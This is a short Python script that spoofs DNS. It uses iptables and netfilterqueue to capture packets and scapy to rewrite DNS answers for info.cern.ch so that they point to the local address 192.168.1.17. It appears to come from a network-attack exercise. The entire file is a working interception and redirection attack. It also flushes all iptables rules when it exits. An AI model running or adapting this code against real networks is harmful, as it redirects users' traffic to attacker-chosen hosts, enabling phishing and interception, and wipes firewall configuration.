#!/usr/bin/env python
import netfilterqueue
import subprocess
import scapy.all as scapy

##subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 8",shell=True)
subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 8",shell=True)
subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 8",shell=True)
def process(packet):
    ## get payload te da informacion del paquete
    scapy_packet =scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):

        qname = scapy_packet[scapy.DNSQR].qname
        if "info.cern.ch" in qname:
            print("[+] Spoofing target")
            ans = scapy.DNSRR(rrname=qname, rdata="192.168.1.17")
            scapy_packet[scapy.DNS].an = ans
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            print (scapy_packet.show())
            packet.set_payload(str(scapy_packet))
    packet.accept()
x = netfilterqueue.NetfilterQueue()
## conect the queue 8 to the function we want to execute
x.bind(8, process)


try:

        x.run()
except KeyboardInterrupt:
    subprocess.call("iptables --flush", shell=True)
    print("[+] se ha interrumpido la conexion")
